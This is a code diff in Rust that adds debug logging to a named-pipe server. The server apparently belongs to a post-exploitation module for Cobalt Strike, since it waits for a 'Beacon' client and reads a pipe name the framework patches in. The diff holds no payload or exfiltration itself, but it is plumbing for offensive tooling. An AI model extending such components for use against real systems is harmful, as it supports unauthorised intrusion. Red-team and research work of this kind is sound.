@@ -66,6 +66,13 @@ pub unsafe fn start_named_pipe_server() -> bool {
         // CS may have rewritten the name; either way, the buffer is a
         // NUL-terminated C string at this point.
         let name_ptr = core::ptr::addr_of_mut!(gPipeName) as *const u8;
+
+        // Log first 64 bytes of gPipeName so we can see what CS patched
+        // in (placeholder = "\\.\pipe\POST_EX_PIPE_NAME_PLEASE..." vs
+        // actual operator pipe path).
+        crate::debug_log::log(b"[pipes] gPipeName bytes:");
+        crate::debug_log::log(core::slice::from_raw_parts(name_ptr, 64));
+
         let h = CreateNamedPipeA(
             name_ptr,
             PIPE_ACCESS_DUPLEX,
@@ -77,8 +84,10 @@ pub unsafe fn start_named_pipe_server() -> bool {
             core::ptr::null(),
         );
         if h == INVALID_HANDLE_VALUE {
+            crate::debug_log::log_last_error(b"[pipes] CreateNamedPipeA FAILED last_error=");
             return false;
         }
+        crate::debug_log::log_hex(b"[pipes] CreateNamedPipeA ok handle_lo=", h as usize as u32);
         gPipeHandle = h;
 
         // Block until Beacon's client side connects, with the same 10-try
@@ -89,12 +98,14 @@ pub unsafe fn start_named_pipe_server() -> bool {
             if timer == 10 {
                 // Time-out — disconnect and close so we don't leave the
                 // pipe lingering for an unrelated process to grab.
+                crate::debug_log::log(b"[pipes] ConnectNamedPipe TIMED OUT after 10s");
                 let _ = DisconnectNamedPipe(h);
                 let _ = CloseHandle(h);
                 gPipeHandle = INVALID_HANDLE_VALUE;
                 return false;
             }
             if ConnectNamedPipe(h, core::ptr::null_mut()) != 0 {
+                crate::debug_log::log_hex(b"[pipes] ConnectNamedPipe ok after sec=", timer as u32);
                 return true;
             }
             Sleep(1000);
